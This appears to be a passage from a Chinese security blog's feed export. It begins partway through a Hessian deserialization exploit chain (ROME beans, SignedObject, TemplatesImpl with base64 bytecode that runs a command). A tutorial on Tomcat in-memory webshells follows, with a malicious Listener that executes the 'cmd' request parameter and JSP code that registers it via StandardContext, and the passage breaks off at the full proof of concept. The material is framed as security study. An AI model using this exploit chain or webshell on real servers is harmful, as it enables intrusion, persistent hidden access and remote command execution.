args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, SignatureException, InvalidKeyException &#123;</span><br><span class="line">        HashMap hashMapx=getObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造SignedObject对象</span></span><br><span class="line">        SignedObject signedObject=<span class="keyword">new</span> <span class="title class_">SignedObject</span>(hashMapx, <span class="keyword">new</span> <span class="title class_">DSAPrivateKey</span>(), <span class="keyword">new</span> <span class="title class_">Signature</span>(<span class="string">&quot;x&quot;</span>) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">engineInitVerify</span><span class="params">(PublicKey publicKey)</span> <span class="keyword">throws</span> InvalidKeyException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">engineInitSign</span><span class="params">(PrivateKey privateKey)</span> <span class="keyword">throws</span> InvalidKeyException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">engineUpdate</span><span class="params">(<span class="type">byte</span> b)</span> <span class="keyword">throws</span> SignatureException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">engineUpdate</span><span class="params">(<span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span> <span class="keyword">throws</span> SignatureException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="type">byte</span>[] engineSign() <span class="keyword">throws</span> SignatureException &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">engineVerify</span><span class="params">(<span class="type">byte</span>[] sigBytes)</span> <span class="keyword">throws</span> SignatureException &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">engineSetParameter</span><span class="params">(String param, Object value)</span> <span class="keyword">throws</span> InvalidParameterException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Object <span class="title function_">engineGetParameter</span><span class="params">(String param)</span> <span class="keyword">throws</span> InvalidParameterException &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造ToStringBean</span></span><br><span class="line">        ToStringBean toStringBean=<span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class,signedObject);</span><br><span class="line">        ToStringBean toStringBean1=<span class="keyword">new</span> <span class="title class_">ToStringBean</span>(String.class,<span class="string">&quot;s&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造ObjectBean</span></span><br><span class="line">        ObjectBean objectBean=<span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造HashMap</span></span><br><span class="line">        HashMap hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(objectBean,<span class="string">&quot;novic4&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射修改字段</span></span><br><span class="line">        Field obj= EqualsBean.class.getDeclaredField(<span class="string">&quot;_obj&quot;</span>);</span><br><span class="line">        Field equalsBean=ObjectBean.class.getDeclaredField(<span class="string">&quot;_equalsBean&quot;</span>);</span><br><span class="line"></span><br><span class="line">        obj.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        equalsBean.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        obj.set(equalsBean.get(objectBean),toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        HessianOutput hessianOutput=<span class="keyword">new</span> <span class="title class_">HessianOutput</span>(ser);</span><br><span class="line">        hessianOutput.writeObject(hashMap);</span><br><span class="line">        hessianOutput.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(ser);</span><br><span class="line">        HessianInput hessianInput=<span class="keyword">new</span> <span class="title class_">HessianInput</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(ser.toByteArray()));</span><br><span class="line">        hessianInput.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String name,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取原生反序列化对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//构造TemplatesImpl对象</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode= Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIAoABgATCgAUABUIABYKABQAFwcACQcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAZAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAAlDb2RlLmphdmEMAAcACAcAGwwAHAAdAQAEY2FsYwwAHgAfAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAADAAEAA0ADQAOAAsAAAAEAAEADAABAA0ADgACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAAEgALAAAABAABAA8AAQANABAAAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABYACwAAAAQAAQAPAAEAEQAAAAIAEg==&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] bytee= <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytee);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Code&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造ToStringBean</span></span><br><span class="line">        ToStringBean toStringBean=<span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templates);</span><br><span class="line">        ToStringBean toStringBean1=<span class="keyword">new</span> <span class="title class_">ToStringBean</span>(String.class,<span class="string">&quot;s&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造ObjectBean</span></span><br><span class="line">        ObjectBean objectBean=<span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造HashMap</span></span><br><span class="line">        HashMap hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(objectBean,<span class="string">&quot;novic4&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射修改字段</span></span><br><span class="line">        Field obj=EqualsBean.class.getDeclaredField(<span class="string">&quot;_obj&quot;</span>);</span><br><span class="line">        Field equalsBean=ObjectBean.class.getDeclaredField(<span class="string">&quot;_equalsBean&quot;</span>);</span><br><span class="line"></span><br><span class="line">        obj.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        equalsBean.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        obj.set(equalsBean.get(objectBean),toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>  hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWeb内存马学习</title>
      <link href="/2023/01/20/Java%E5%AE%89%E5%85%A8%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2023/01/20/Java%E5%AE%89%E5%85%A8%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaWeb内存马"><a href="#JavaWeb内存马" class="headerlink" title="JavaWeb内存马"></a>JavaWeb内存马</h1><h2 id="0x00-前置知识"><a href="#0x00-前置知识" class="headerlink" title="0x00 前置知识"></a>0x00 前置知识</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>内存马又名无文件马，见名知意，也就是无文件落地的 webshell 技术，是由于 webshell 特征识别、防篡改、目录监控等等针对 web 应用目录或服务器文件防御手段的介入，导致的文件 shell 难以写入和持久而衍生出的一种“概念型”木马。这种技术的核心思想非常简单，一句话就能概括，那就是对访问路径映射及相关处理代码的<strong>动态注册</strong>。</p><h3 id="Tomcat中的三种Context"><a href="#Tomcat中的三种Context" class="headerlink" title="Tomcat中的三种Context"></a>Tomcat中的三种Context</h3><p>在Tomcat中，Context是Container组件的一种子容器，其对应的是一个Web应用。Context中可以包含多个Wrapper容器，而Wrapper对应的是一个具体的Servlet定义。因此Context可以用来保存一个Web应用中多个Servlet的上下文信息。</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301312147565.png"                      alt="image-20230131214733513"                ><figcaption>image-20230131214733513</figcaption></figure></p><h3 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h3><p>Servlet规范中规定了一个ServletContext接口，其用来保存一个Web应用中所有Servlet的上下文信息，能对Servlet中的各种资源进行访问、添加、删除等。其在Java中的具体实现是<code>javax.servlet.ServletContext</code>接口</p><h3 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h3><p>在Tomcat中，ServletContext接口的具体实现就是ApplicationContext类，其实现了ServletContext接口中定义的一些方法。</p><p>Tomcat这里使用了<code>门面模式</code>，对<code>ApplicationContext</code>类进行了封装，我们调用<code>getServletContext()</code>方法获得的其实是<code>ApplicationContextFacade</code>类(门面类)</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ApplicationContextFacade</span><span class="params">(ApplicationContext context)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.context = context;<span class="comment">//context的传递</span></span><br><span class="line"> </span><br><span class="line">        classCache = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        objectCache = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;();</span><br><span class="line">        initClassCache();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p><code>ApplicationContextFacade</code>类方法中都会调用this.context相应的方法，因此最终调用的还是<code>ApplicationContext</code>类的方法。</p><blockquote><p>门面模式可以简单分为三个部分:子系统、门面(Facade)、客户端</p><p>客户端可以通过调用门面方法进而调用集成的子系统方法，以医院类比，客户端相当于病人，门面相当于接待员，而子系统是医院内部细化的各部门。</p></blockquote><h3 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h3><p><code>org.apache.catalina.core.StandardContext</code>是子容器<code>Context</code>的标准实现类，其中包含了对Context子容器中资源的各种操作。</p><p><code>ApplicationContext</code>中的许多方法实际上还是调用了<code>StandardContext</code>中的方法</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApplicationContext</span> <span class="keyword">implements</span> <span class="title class_">ServletContext</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> StandardContext context;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> String <span class="title function_">getRequestCharacterEncoding</span><span class="params">()</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> context.getRequestCharacterEncoding();</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202301312219609.png"                      alt="image-20230131221926469"                ><figcaption>image-20230131221926469</figcaption></figure></p><blockquote><p>可以看出我们对Context容器中各种资源进行操作时，最终调用的还是StandardContext中的方法，因此StandardContext是Tomcat中负责与底层交互的Context。</p></blockquote><h2 id="0x01-Tomcat内存马"><a href="#0x01-Tomcat内存马" class="headerlink" title="0x01 Tomcat内存马"></a>0x01 Tomcat内存马</h2><p>Tomcat内存马大致可以分为三类，分别是Listener型、Filter型、Servlet型,Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中。</p><p>这依赖于官方对Servlet3.0的升级，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，为方便调试，先加入Tomcat依赖</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>10.0.23<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>注意版本与本机tomcat匹配，tomcat10后把很多常用类的位置都改了</p></blockquote><h3 id="Listener型"><a href="#Listener型" class="headerlink" title="Listener型"></a>Listener型</h3><p>目标就是在服务器中动态注册一个恶意的Listener。</p><p>而Listener根据事件源的不同，大致可以分为如下三种</p><ul><li>ServletContextListener</li><li>HttpSessionListener</li><li>ServletRequestListener</li></ul><blockquote><p><code>ServletRequestListener</code>用于监听<code>ServletRequest</code>对象，当我们访问任意资源时，都会触发<code>ServletRequestListener#requestInitialized()</code>方法</p></blockquote><p>创建一个Servlet项目实现恶意Listener,目录配置⬇️</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010141228.png"                      alt="image-20230201014157169"                ><figcaption>image-20230201014157169</figcaption></figure></p><p>shell_Listener</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shell_Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">        String cmd=request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                n.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>访问任意目录可以执行命令</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010146200.png"                      alt="image-20230201014602139"                ><figcaption>image-20230201014602139</figcaption></figure></p><blockquote><p>接下来只要将恶意Listener动态注册进服务器</p></blockquote><h4 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h4><p>调用栈</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">requestInitialized:<span class="number">13</span>, shell_Listener (Listener)</span><br><span class="line">fireRequestInitEvent:<span class="number">5992</span>, StandardContext (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">121</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">92</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">687</span>, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">78</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">357</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">382</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">65</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">895</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1722</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure></div><p>跟进<code>StandardContext#fireRequestInitEvent</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">fireRequestInitEvent</span><span class="params">(ServletRequest request)</span> &#123;</span><br><span class="line">        Object instances[] = getApplicationEventListeners();<span class="comment">//获取Listener数组</span></span><br><span class="line">        <span class="keyword">if</span> ((instances != <span class="literal">null</span>) &amp;&amp; (instances.length &gt; <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="type">ServletRequestEvent</span> <span class="variable">event</span> <span class="operator">=</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ServletRequestEvent</span>(getServletContext(), request);</span><br><span class="line">            <span class="keyword">for</span> (Object instance : instances) &#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!(instance <span class="keyword">instanceof</span> ServletRequestListener)) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> (ServletRequestListener) instance;</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    listener.requestInitialized(event);<span class="comment">//遍历触发数组内各Listener的requestInitialized方法</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                    ExceptionUtils.handleThrowable(t);</span><br><span class="line">                    getLogger().error(sm.getString(</span><br><span class="line">                            <span class="string">&quot;standardContext.requestListener.requestInit&quot;</span>,</span><br><span class="line">                            instance.getClass().getName()), t);</span><br><span class="line">                    request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, t);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>跟进第一行的<code>getApplicationEventListeners()</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;Object&gt; applicationEventListenersList = <span class="keyword">new</span> <span class="title class_">CopyOnWriteArrayList</span>();<span class="comment">//存储里Listener</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">public</span> Object[] getApplicationEventListeners() &#123;</span><br><span class="line">    <span class="keyword">return</span> applicationEventListenersList.toArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202302010157913.png"                      alt="image-20230201015745831"                ><figcaption>image-20230201015745831</figcaption></figure></p><p><code>StandardContext</code>也定义类添加Listener的方法,那么我们为了注册恶意Listener，就必须先获取<code>StandardContext</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addApplicationEventListener</span><span class="params">(Object listener)</span> &#123;</span><br><span class="line">        applicationEventListenersList.add(listener);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><h4 id="获取StandardContext类"><a href="#获取StandardContext类" class="headerlink" title="获取StandardContext类"></a>获取StandardContext类</h4><p>在<code>StandardHostValve#invoke</code>中，可以看到其通过request对象来获取<code>StandardContext</code>类</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span><span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="comment">// Select the Context to be used for this Request</span></span><br><span class="line">    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> request.getContext();</span><br></pre></td></tr></table></figure></div><p>JSP内置了request对象,因此我们可以通过反射获取</p><div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div><p>也可以利用类加载器</p><div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div><p>再添加一下上面写的恶意Listener</p><div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="type">shell_Listener</span> <span class="variable">shell_listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">shell_Listener</span>();</span><br><span class="line">  context.addApplicationEventListener(shell_listener);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div><h4 id="完整POC"><a href="#完整POC" class="headerlink" 